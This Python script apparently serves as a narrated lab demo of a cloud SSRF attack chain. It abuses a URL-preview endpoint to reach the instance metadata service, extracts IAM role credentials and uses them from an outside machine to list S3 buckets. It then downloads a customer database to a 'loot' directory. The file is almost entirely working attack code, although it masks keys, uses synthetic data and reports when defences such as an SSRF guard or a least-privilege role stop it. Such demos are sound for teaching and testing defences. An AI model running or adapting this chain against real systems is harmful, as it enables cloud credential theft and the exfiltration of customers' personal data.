"""Narrated end-to-end attack (for live demo and screenshots).

  1. Use the app normally          2. SSRF probe of the metadata service
  3. Discover the IAM role name     4. Steal the role's temporary credentials
  5. Use them from the attacker's own machine to list buckets
  6. Exfiltrate the customer database
"""
import csv
import io
import os
import sys

from botocore.exceptions import ClientError

from common import TARGET, mask, parse_creds, s3_with, ssrf, wait_ready

G, Y, RD, C, B, X = "\033[92m", "\033[93m", "\033[91m", "\033[96m", "\033[1m", "\033[0m"
META = "http://169.254.169.254/latest/meta-data/"


def step(n, title):
    print(f"\n{B}{C}[STEP {n}] {title}{X}")


def stop(reason):
    print(f"  {RD}{B}ATTACK STOPPED:{X} {RD}{reason}{X}")
    print(f"\n{B}RESULT: attack chain broken at this step.{X}")
    sys.exit(0)


def show_fetch(res):
    if res.get("blocked"):
        stop(f"blocked by SSRF guard -> {res['reason']}")
    if "error" in res:
        stop(f"server could not fetch it ({res['error']})")
    if res.get("status") != 200:
        stop(f"target answered HTTP {res.get('status')} (request refused)")


def main():
    wait_ready()
    print(f"{B}=== Cloud SSRF attack chain against {TARGET} ==={X}")

    step(1, "Recon: use the URL-preview feature as a normal user")
    r = ssrf("http://cdn.example.net/")
    print(f"  fetch http://cdn.example.net/ -> HTTP {r.get('status')}  ({r['elapsed_ms']} ms)")
    print(f"  {Y}=> the server fetches any URL we give it: potential SSRF{X}")

    step(2, "SSRF: make the server read its own cloud metadata service")
    r = ssrf(META)
    show_fetch(r)
    print("  " + r["content"].replace("\n", "  "))
    print(f"  {Y}=> metadata reachable through the web server (IMDSv1, no token needed){X}")

    step(3, "Discover the IAM role attached to the instance")
    r = ssrf(META + "iam/security-credentials/")
    show_fetch(r)
    role = r["content"].strip()
    print(f"  role name: {B}{role}{X}")

    step(4, "Steal the role credentials")
    r = ssrf(META + f"iam/security-credentials/{role}")
    show_fetch(r)
    creds = parse_creds(r["content"])
    if not creds:
        stop("no credentials in response")
    print(f"  AccessKeyId     : {mask(creds['AccessKeyId'])}")
    print(f"  SecretAccessKey : {mask(creds['SecretAccessKey'])}   (masked for the report)")
    print(f"  Expiration      : {creds['Expiration']}")
    print(f"  {RD}=> credentials exfiltrated to the attacker's machine{X}")

    step(5, "Use the stolen credentials from OUTSIDE the cloud (attacker IP 203.0.113.100)")
    s3 = s3_with(creds)
    try:
        buckets = [b["Name"] for b in s3.list_buckets().get("Buckets", [])]
        print(f"  ListBuckets -> {buckets}")
    except ClientError as e:
        print(f"  ListBuckets -> {RD}{e.response['Error']['Code']}{X}")
        buckets = []

    step(6, "Exfiltrate the customer database")
    try:
        objs = s3.list_objects_v2(Bucket="customer-data").get("Contents", [])
        print("  objects: " + ", ".join(f"{o['Key']} ({o['Size']} B)" for o in objs))
        body = s3.get_object(Bucket="customer-data", Key="exports/customers.csv")["Body"].read().decode()
    except ClientError as e:
        stop(f"S3 refused the stolen key: {e.response['Error']['Code']} (least-privilege role)")
    rows = list(csv.DictReader(io.StringIO(body)))
    os.makedirs("/results/loot", exist_ok=True)
    with open("/results/loot/customers.csv", "w", encoding="utf-8") as fh:
        fh.write(body)
    print(f"  {RD}{B}downloaded {len(rows)} customer records{X} -> results/loot/customers.csv")
    for row in rows[:3]:
        print(f"    {row['customer_id']}  {row['full_name']:<20} {row['city']:<8} card ****{row['card_last4']}  score {row['credit_score']}")
    print(f"\n{RD}{B}RESULT: full compromise - {len(rows)} records stolen (synthetic data){X}")


if __name__ == "__main__":
    main()
